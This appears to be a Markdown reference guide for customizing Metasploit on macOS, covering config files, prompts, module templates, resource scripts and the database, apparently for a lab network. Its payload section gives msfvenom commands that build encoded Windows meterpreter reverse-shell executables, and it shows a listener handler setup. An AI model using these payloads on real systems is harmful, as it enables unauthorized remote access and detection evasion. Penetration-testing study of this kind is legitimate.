# Metasploit Customization Guide

Complete reference for customizing Metasploit Framework on macOS.

## Directory Structure

```
~/.msf4/                    # User configuration directory
├── database.yml            # PostgreSQL connection settings
├── msfconsole.rc           # Startup commands (like .bashrc for msf)
├── history                 # Command history
├── modules/                # Your custom modules
│   ├── auxiliary/          # Scanners, fuzzers, etc.
│   ├── exploits/           # Custom exploits
│   ├── payloads/           # Custom payloads
│   └── post/               # Post-exploitation modules
├── plugins/                # Custom plugins
├── scripts/                # Resource scripts (.rc files)
├── logos/                  # Custom ASCII banners
├── loot/                   # Extracted data from targets
├── local/                  # Local data storage
└── logs/                   # Session and console logs
```

## msfconsole.rc - Startup Configuration

This file runs every time you start msfconsole. Think of it as your `.bashrc` for Metasploit.

### Location
```
~/.msf4/msfconsole.rc
```

### Example Configuration

```ruby
# ============================================
# Metasploit Startup Configuration
# ============================================

# ----- Global Options -----
# These persist across module changes
setg RHOSTS 172.20.0.0/24
setg LHOST 172.20.0.1
setg LPORT 4444

# ----- Console Appearance -----
# Custom prompt with timestamp
set Prompt %blu%T%clr %grn%L%clr msf
set PromptChar >

# Enable timestamps on output
set TimestampOutput true

# ----- Logging -----
# Log all console I/O (useful for learning)
set ConsoleLogging true

# Log all session traffic
set SessionLogging true

# ----- Database -----
# Check DB on startup
db_status

# Use default workspace
workspace -a learning

# ----- Aliases -----
# Create shortcuts (these are actually macros)
# Use: alias <name> <command>

# ----- Load Plugins -----
# load msgrpc          # RPC interface
# load sounds          # Audio notifications
# load wiki            # Documentation helper
```

## Global Options Reference

Set with `setg` (persists) or `set` (module-only):

| Option | Example | Description |
|--------|---------|-------------|
| RHOSTS | 172.20.0.10 | Target host(s) |
| RPORT | 80 | Target port |
| LHOST | 172.20.0.1 | Your IP (for reverse shells) |
| LPORT | 4444 | Your listening port |
| THREADS | 10 | Concurrent threads |
| Prompt | msf | Console prompt |
| PromptChar | > | Character after prompt |
| ConsoleLogging | true | Log console I/O |
| SessionLogging | true | Log session traffic |
| LogLevel | 0-3 | Verbosity (0=normal, 3=debug) |
| TimestampOutput | true | Prefix output with time |
| MinimumRank | 0-600 | Minimum exploit rank to run |

### Prompt Escape Sequences

| Escape | Meaning |
|--------|---------|
| %T | Current time |
| %D | Current date |
| %H | Hostname |
| %U | Username |
| %L | LHOST value |
| %S | Active session count |
| %J | Active jobs count |
| %grn, %red, %blu | Colors |
| %clr | Reset color |

Example:
```ruby
set Prompt %grn[%T]%clr %blu%U@%H%clr
```

## Custom Modules

### Module Types

| Type | Path | Purpose |
|------|------|---------|
| auxiliary | modules/auxiliary/ | Scanners, fuzzers, DoS |
| exploits | modules/exploits/ | Active exploitation |
| payloads | modules/payloads/ | Code to run post-exploit |
| post | modules/post/ | Post-exploitation |
| encoders | modules/encoders/ | Payload encoding |
| nops | modules/nops/ | NOP sleds |

### Basic Module Template

```ruby
# ~/.msf4/modules/auxiliary/scanner/my_scanner.rb

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'My Custom Scanner',
      'Description' => 'Scans for something',
      'Author'      => ['Your Name'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(80)
    ])
  end

  def run_host(ip)
    # Your scanning logic here
    print_status("Scanning #{ip}")
  end
end
```

### Loading Custom Modules

```
msf6> reload_all           # Reload all modules
msf6> loadpath ~/.msf4/modules  # Load from specific path
```

## Resource Scripts

Resource scripts are batch files for msfconsole commands.

### Location
```
~/.msf4/scripts/
```

### Example: Quick Scan Script

```ruby
# ~/.msf4/scripts/quickscan.rc

# Set target
<ruby>
target = framework.datastore['RHOSTS'] || '172.20.0.10'
</ruby>

# Run comprehensive scan
db_nmap -sV -sC -O -A #{target}

# List what we found
hosts
services
vulns
```

### Running Scripts

```
msf6> resource ~/.msf4/scripts/quickscan.rc
msf6> resource /path/to/script.rc
```

Or from command line:
```bash
msfconsole -r ~/.msf4/scripts/quickscan.rc
```

## Plugins

### Built-in Plugins

| Plugin | Purpose |
|--------|---------|
| db_tracker | Track database changes |
| ips_filter | Filter by IPS evasion |
| sounds | Audio notifications |
| token_adduser | Token manipulation |
| wiki | Module documentation |

### Loading Plugins

```
msf6> load sounds
msf6> unload sounds
```

### Plugin Locations

```
/opt/metasploit-framework/embedded/framework/plugins/  # System
~/.msf4/plugins/                                       # User
```

## Database Configuration

### database.yml

```yaml
# ~/.msf4/database.yml
development: &pgsql
  adapter: postgresql
  database: msf
  username: msf
  password: <auto-generated>
  host: 127.0.0.1
  port: 5433
  pool: 200

production:
  <<: *pgsql
```

### Database Commands

```
db_status          # Check connection
db_connect         # Connect to DB
db_disconnect      # Disconnect
db_rebuild_cache   # Rebuild module cache
db_nmap            # Scan and store results

# Data viewing
hosts              # List hosts
services           # List services
vulns              # List vulnerabilities
creds              # List credentials
loot               # List loot

# Workspaces
workspace          # List workspaces
workspace -a name  # Add workspace
workspace name     # Switch to workspace
workspace -d name  # Delete workspace
```

## Custom Logos/Banners

Place ASCII art files in `~/.msf4/logos/` to randomly display on startup.

```
~/.msf4/logos/
├── my_banner1.txt
├── my_banner2.txt
└── custom.txt
```

## Useful Aliases/Macros

Add to msfconsole.rc:

```ruby
# Can't create true aliases, but can use Ruby
<ruby>
def quick_scan(target)
  run_single("db_nmap -sV #{target}")
  run_single("hosts")
  run_single("services")
end
</ruby>
```

## Performance Tuning

```ruby
# In msfconsole.rc

# Increase threads for scanning
setg THREADS 20

# Disable banner for faster startup
# Start with: msfconsole -q

# Use database caching
db_rebuild_cache
```

## Payload Customization

### Default Payload Options

```ruby
setg PAYLOAD windows/meterpreter/reverse_tcp
setg LHOST 172.20.0.1
setg LPORT 4444
setg AutoRunScript migrate -f  # Auto-migrate on connect
```

### Generate Custom Payloads

```bash
# Basic reverse shell
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=172.20.0.1 LPORT=4444 \
  -f exe > shell.exe

# With encoding
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=172.20.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe > encoded.exe
```

## Integration with SET

SET can automatically configure Metasploit handlers:

1. SET generates payload
2. SET writes an `.rc` file
3. SET launches msfconsole with that `.rc`
4. You get an auto-configured listener

To manually set up a handler:

```ruby
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.20.0.1
set LPORT 4444
exploit -j  # Run as background job
```

## Troubleshooting

### Module not loading
```
reload_all
# or check for syntax errors:
ruby -c ~/.msf4/modules/path/to/module.rb
```

### Database issues
```bash
msfdb reinit   # Reinitialize completely
msfdb start    # Just start PostgreSQL
```

### Slow startup
```bash
msfconsole -q  # Skip banner
# Or in rc file:
set Banner false
```
